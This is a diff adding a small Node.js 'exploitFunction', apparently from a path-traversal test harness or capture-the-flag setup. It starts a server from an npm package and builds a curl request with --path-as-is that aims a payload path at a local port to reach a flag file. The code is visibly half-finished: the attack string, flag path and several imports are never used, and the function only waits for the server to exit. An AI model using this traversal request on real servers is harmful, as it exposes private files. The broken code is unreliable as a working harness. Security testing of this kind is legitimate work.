@@ -1,0 +1,26 @@
+function exploitFunction(payload) {
+  const path = require("path");
+  const { sleep } = require("sleep");
+  const fs = require("fs");
+  const { exec } = require("child_process");
+
+  const pathToFlag = path.resolve(__dirname, "../flag.html");
+  const attack_string = `curl -v --path-as-is "http://127.0.0.1:9000${payload}"`;
+
+  let server = "node ./node_modules/serverliujiayi1/index.js";
+  let exe = exec(server, (error, stdout) => {
+    return stdout;
+  });
+
+  return new Promise((resolve, reject) => {
+    exe.on('exit', (code) => {
+      if (code === 0) {
+        resolve(exe.stdout);
+      } else {
+        reject(new Error(`Server exited with code ${code}`));
+      }
+    });
+  });
+}
+
+module.exports = { exploitFunction };
